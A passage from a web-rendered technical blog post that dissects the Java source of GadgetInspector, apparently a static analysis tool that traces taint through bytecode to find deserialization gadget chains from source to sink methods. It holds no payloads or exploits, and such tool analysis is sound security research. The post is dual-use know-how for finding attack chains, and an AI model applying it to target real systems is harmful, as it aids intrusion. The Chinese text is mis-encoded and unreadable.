class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc)</span> </span>&#123;    <span class="comment">// è®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½è®¿é—®å¯¹è±¡å­—æ®µï¼Œè®¿é—®å‰ä¼šè¿›è¡Œå…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// è·å–ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// è®¾ç½®ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// è·å–å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            Type type = Type.getType(desc); <span class="comment">// å­—æ®µç±»å‹</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                Boolean isTransient = <span class="keyword">null</span>; <span class="comment">// å¦‚æœå­—æ®µè¢« transient å…³é”®å­—ä¿®é¥°ï¼Œåˆ™ä¸å¯åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆ¤æ–­è¯»å–çš„å­—æ®µæ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå³å­—æ®µæ˜¯å¦å¯ä»¥åºåˆ—åŒ–</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// è‹¥è¯»å–çš„å­—æ®µæ‰€å±ç±»å¯åºåˆ—åŒ–</span></span><br><span class="line">                    ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// éå†ç±»çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// æ˜¯å¦ä¸ºç›®æ ‡å­—æ®µ</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// æ˜¯å¦è¢« transient å…³é”®å­—ä¿®é¥°</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// è‹¥æ‰¾ä¸åˆ°ç›®æ ‡å­—æ®µï¼Œåˆ™å‘ä¸ŠæŸ¥æ‰¾ï¼ˆè¶…ç±»ï¼‰</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">                Set&lt;String&gt; newTaint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                        newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);   <span class="comment">// æ‹¼æ¥åç§°</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">                <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setStackTaint å°†æ ˆé¡¶è®¾ç½®ä¸º newTaint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// è®¾ç½®å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> æ–¹æ³•åˆ†æè¢«è°ƒæ–¹æ³•çš„æ“ä½œæ•°æ ˆï¼Œæ ˆä¸­çš„å…ƒç´ è¦ä¹ˆä¸ºç©ºé›†åˆï¼Œè¦ä¹ˆä¸ºèƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°é›†åˆï¼Œæ¨¡æ‹Ÿæ“ä½œæ•°æ ˆçš„å…ƒç´ ä¸ªæ•°ï¼Œä½†å…ƒç´ å€¼æ˜¯é›†åˆï¼ˆæ¨¡æ‹Ÿå€¼ï¼Œä¸æ˜¯çœŸå®/å®é™…å€¼ï¼‰ã€‚<br>æœ€å¼€å§‹çš„æ—¶å€™å·²ç»å°†å½“å‰æ–¹æ³•çš„å‚æ•°ä»¥ <code>argå‚æ•°ç´¢å¼•</code> çš„å½¢å¼å­˜å‚¨åˆ°äº†æœ¬åœ°å˜é‡è¡¨ï¼Œå½“è°ƒç”¨å…¶ä»–æ–¹æ³•æ—¶ï¼Œä¼šä»æœ¬åœ°å˜é‡è¡¨åŠ è½½æ•°æ®åˆ°æ ˆä¸­ï¼Œå¦‚æœç”¨åˆ°å¯¹è±¡å­—æ®µï¼Œåˆ™ä»¥ <code>argå‚æ•°ç´¢å¼•.å­—æ®µåç§°</code> çš„å½¢å¼å…¥æ ˆï¼Œå› æ­¤æ ¹æ®æ ˆä¸­å…ƒç´ çš„åç§°å°±å¯ä»¥å¾—çŸ¥æ–¹æ³•çš„å“ªäº›å‚æ•°ï¼ˆæ ¹æ®åç§°åˆ¤æ–­ï¼‰å½±å“äº†è¢«è°ƒæ–¹æ³•çš„å“ªäº›å‚æ•°ï¼ˆå·²çŸ¥å‚æ•°ä¸ªæ•°ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;  <span class="comment">// è®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// è·å–è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°å’Œç±»å‹ï¼Œéé™æ€æ–¹æ³•éœ€è¦æŠŠå®ä¾‹ç±»å‹æ”¾åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="comment">// æ ¹æ®æè¿°ç¬¦å¾—å‡ºè¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡æœ¬èº«ï¼Œå³ this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;   <span class="comment">// éé™æ€æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å®ä¾‹</span></span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> Type[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// å¯¹è±¡ç±»å‹</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// è°ƒç”¨å®ä¾‹æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// è°ƒç”¨è¶…ç±»æ„é€ æ–¹æ³•ï¼Œå®ä¾‹åˆå§‹åŒ–æ–¹æ³•ï¼Œç§æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// è°ƒç”¨æ¥å£æ–¹æ³•</span></span><br><span class="line">            <span class="keyword">int</span> stackIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// è¢«è°ƒç”¨æ–¹æ³•çš„æ“ä½œæ•°æ ˆ</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="comment">// æœ€å³è¾¹çš„å‚æ•°ï¼Œå°±æ˜¯æœ€åå…¥æ ˆï¼Œå³åœ¨æ ˆé¡¶</span></span><br><span class="line">                <span class="keyword">int</span> argIndex = argTypes.length - <span class="number">1</span> - i; <span class="comment">// å‚æ•°ç´¢å¼•</span></span><br><span class="line">                Type type = argTypes[argIndex]; <span class="comment">// å‚æ•°ç±»å‹</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// å‚æ•°ä»å³å¾€å·¦å…¥æ ˆï¼Œå› æ­¤æœ€å³è¾¹çš„å‚æ•°åœ¨æ ˆåº•</span></span><br><span class="line">                Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœå­˜åœ¨èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°</span></span><br><span class="line">                    <span class="comment">// éå†å‚æ•°</span></span><br><span class="line">                    <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;arg&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Invalid taint arg: &quot;</span> + argSrc);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// argæ•°å­—.å­—æ®µåç§°</span></span><br><span class="line">                        <span class="keyword">int</span> dotIndex = argSrc.indexOf(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// åˆ†éš”ä½ç½®</span></span><br><span class="line">                        <span class="keyword">int</span> srcArgIndex;    <span class="comment">// ç¬¬å‡ ä¸ªå‚æ•°</span></span><br><span class="line">                        String srcArgPath;</span><br><span class="line">                        <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                            srcArgPath = <span class="keyword">null</span>;  <span class="comment">// æ²¡æœ‰åç§°</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                            srcArgPath = argSrc.substring(dotIndex + <span class="number">1</span>);  <span class="comment">// å­—æ®µåç§°</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// è®°å½•å‚æ•°æµåŠ¨å…³ç³»</span></span><br><span class="line">                        <span class="comment">// argIndexï¼šå½“å‰æ–¹æ³•å‚æ•°ç´¢å¼•ï¼›srcArgIndexï¼šå¯¹åº”ä¸Šä¸€çº§æ–¹æ³•çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">                        discoveredCalls.add(<span class="keyword">new</span> GraphCall(</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(<span class="keyword">this</span>.owner), <span class="keyword">this</span>.name, <span class="keyword">this</span>.desc),</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc),</span><br><span class="line">                                srcArgIndex,</span><br><span class="line">                                srcArgPath,</span><br><span class="line">                                argIndex));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¾€å·¦ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">                stackIndex += type.getSize();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitMethodInsn æ‰§è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> æ–¹æ³•å­˜å‚¨åˆ†æå¾—åˆ°çš„è°ƒç”¨å…³ç³»ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨è°ƒç”¨å…³ç³»ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> GraphCall.Factory(), discoveredCalls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-GadgetChainDiscovery"><a href="#8-GadgetChainDiscovery" class="headerlink" title="8. GadgetChainDiscovery"></a>8. GadgetChainDiscovery</h2><p>é’ˆå¯¹ä¸åŒçš„æŒ–æ˜ç±»å‹ï¼Œæ±¡ç‚¹æºä¿¡æ¯æ”¶é›†çš„å®ç°ä¸åŒï¼Œè¿™é‡Œå…³æ³¨ Java åŸç”Ÿåºåˆ—åŒ–çš„æ±¡ç‚¹æºï¼Œåˆ†æå·²ç»åœ¨ <strong>0x02 é¡¹ç›®ç»“æ„ - gadgetinspector/javaserial - SimpleSourceDiscovery</strong> ä¸€èŠ‚ä¸­ç»™å‡ºã€‚</p><p>æŒ–æ˜åˆ©ç”¨é“¾å®é™…å°±æ˜¯æ‰¾ä¸€æ¡ä» source ç‚¹åˆ° sink ç‚¹çš„è·¯å¾„ï¼Œå‰é¢æ”¶é›†çš„ä¿¡æ¯éƒ½æ˜¯ä¸ºäº†è¿™é‡Œçš„æœç´¢åšå‡†å¤‡ã€‚</p><p>è¿™é‡Œå®šä¹‰äº†ä¸¤ä¸ªç±»åˆ†åˆ«è¡¨ç¤ºåˆ©ç”¨é“¾å’Œåˆ©ç”¨é“¾ä¸Šçš„çš„èŠ‚ç‚¹ï¼ˆå³æ–¹æ³•ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨é“¾</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">GadgetChain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;GadgetChainLink&gt; links;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GadgetChain</span><span class="params">(List&lt;GadgetChainLink&gt; links)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GadgetChain</span><span class="params">(GadgetChain gadgetChain, GadgetChainLink link)</span> </span>&#123;</span><br><span class="line">        List&lt;GadgetChainLink&gt; links = <span class="keyword">new</span> ArrayList&lt;GadgetChainLink&gt;(gadgetChain.links);</span><br><span class="line">        links.add(link);</span><br><span class="line">        <span class="keyword">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ©ç”¨é“¾ï¼ˆèŠ‚ç‚¹ï¼‰</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">GadgetChainLink</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle method;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> taintedArgIndex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">GadgetChainLink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> taintedArgIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.method = method;</span><br><span class="line">        <span class="keyword">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        GadgetChainLink that = (GadgetChainLink) o;</span><br><span class="line">        <span class="keyword">if</span> (taintedArgIndex != that.taintedArgIndex) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> method != <span class="keyword">null</span> ? method.equals(that.method) : that.method == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = method != <span class="keyword">null</span> ? method.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + taintedArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> æ–¹æ³•é¦–å…ˆåŠ è½½æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯ï¼Œè°ƒç”¨ <code>InheritanceDeriver.getAllMethodImplementations</code> è·å–æ–¹æ³•çš„é‡å†™ä¿¡æ¯ï¼Œåˆ†æä¹Ÿå·²ç»åœ¨ <strong>0x02 é¡¹ç›®ç»“æ„</strong> ä¸€èŠ‚ä¸­ç»™å‡ºï¼Œå¹¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå†åŠ è½½ä¸Šä¸€æ­¥å¾—åˆ°çš„è°ƒç”¨å…³ç³»ä¿¡æ¯ã€‚</p><p>ç„¶ååŠ è½½æ±¡ç‚¹æºä¿¡æ¯ï¼Œå°†æ¯ä¸ª source æ–¹æ³•ä½œä¸ºåˆå§‹èŠ‚ç‚¹åˆ›å»ºä¸€æ¡é“¾ï¼ŒåŠ å…¥å¾…åˆ†æçš„é“¾é›†åˆã€‚éå†é›†åˆä¸­çš„é“¾ï¼Œå–å‡ºé“¾å¹¶ä»å°¾èŠ‚ç‚¹ï¼ˆæ–¹æ³•ï¼‰å¼€å§‹åˆ†æï¼Œç¬¬ä¸€æ¬¡åˆ†ææ±¡ç‚¹æºï¼Œå¦‚æœå…¶å‚æ•°ç´¢å¼•ä¸è¢«è°ƒæ–¹æ³•çš„å‚æ•°ç´¢å¼•ç›¸åŒï¼Œåˆ™åˆ›å»ºæ–°èŠ‚ç‚¹å¹¶åŠ å…¥é“¾çš„æœ€æœ«ç«¯ï¼Œå¦‚æœè¢«è°ƒæ–¹æ³•ä¸æ˜¯ sink ç‚¹ï¼Œåˆ™åŠ å…¥å¾…åˆ†æçš„é“¾é›†åˆï¼Œå¦åˆ™åŠ å…¥å‘ç°çš„åˆ©ç”¨é“¾é›†åˆã€‚ä¹‹åé‡å¤ä¸Šé¢çš„æ­¥éª¤ï¼Œé›†åˆä¸­å¾…åˆ†æçš„é“¾ä¼šè¶Šæ¥è¶Šé•¿ï¼Œç›´åˆ°æ‰€æœ‰é“¾éƒ½è¢«å¼¹å‡ºå’Œåˆ†æå®Œæ¯•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æœç´¢å¯èƒ½çš„åˆ©ç”¨é“¾ï¼Œä¿å­˜åˆ° gadget-chains.txt ä¸­</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span 